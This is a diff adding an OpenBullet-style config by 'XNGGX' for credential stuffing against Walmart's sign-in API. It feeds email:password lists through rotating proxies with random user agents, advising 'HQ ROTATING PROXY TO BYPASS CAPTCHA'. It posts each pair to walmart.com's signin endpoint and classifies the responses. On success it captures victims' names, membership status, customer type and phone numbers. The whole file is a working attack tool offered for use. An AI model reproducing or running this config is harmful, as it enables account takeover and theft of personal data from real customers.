@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "WALMART [xnggx]",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-11T11:33:33.1658728+07:00",
+  "AdditionalInfo": "NEED HQ ROTATING PROXY TO BYPASS CAPTCHA",
+  "Author": "XNGGX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#R FUNCTION URLDecode "id=0&returnUrl=%2F" -> VAR "R" 
+
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#LEN FUNCTION Length "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberme\":true,\"showRememberme\":\"true\"}" -> VAR "LEN" 
+
+#LOGIN REQUEST POST "https://www.walmart.com/account/electrode/api/signin?<R>" AcceptEncoding=FALSE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberme\":true,\"showRememberme\":\"false\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.walmart.com/account/signinwithpassword?tid=0&returnUrl=%2F" 
+  HEADER "content-type: application/json" 
+  HEADER "Origin: https://www.walmart.com" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your password and email do not match. Please try again or Reset Your Password." 
+  KEYCHAIN Retry OR 
+    KEY "/captcha/captcha.js?" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"OK\",\"" 
+    KEY "<COOKIES>" Contains "type: REGISTERED" 
+
+#cid PARSE "<SOURCE>" JSON "cid" -> VAR "cid" 
+
+#Firstname PARSE "<SOURCE>" JSON "firstName" -> VAR "Fname" 
+
+#Lastname PARSE "<SOURCE>" JSON "lastName" -> VAR "LName" 
+
+#Name FUNCTION Constant "<Fname> <LName>" -> CAP "Name" 
+
+#Member PARSE "<SOURCE>" JSON "subscribed" CreateEmpty=FALSE -> CAP "Member" 
+
+#Customer_Type PARSE "<SOURCE>" JSON "customerType" CreateEmpty=FALSE -> CAP "Customer Type" 
+
+#isPhoneConfirmed PARSE "<SOURCE>" JSON "isPhoneConfirmed" -> VAR "Phone" 
+
+#Phone_Verified FUNCTION Translate 
+  KEY "true" VALUE "Yes" 
+  KEY "false" VALUE "No" 
+  "<Phone>" -> CAP "Phone Verified" 
+
+#Phones PARSE "<SOURCE>" JSON "phoneNumber" -> VAR "Phones" 
+
+#Phone_Number FUNCTION Translate 
+  KEY "null" VALUE "-" 
+  "<Phones>" -> CAP "Phone Number" 
+
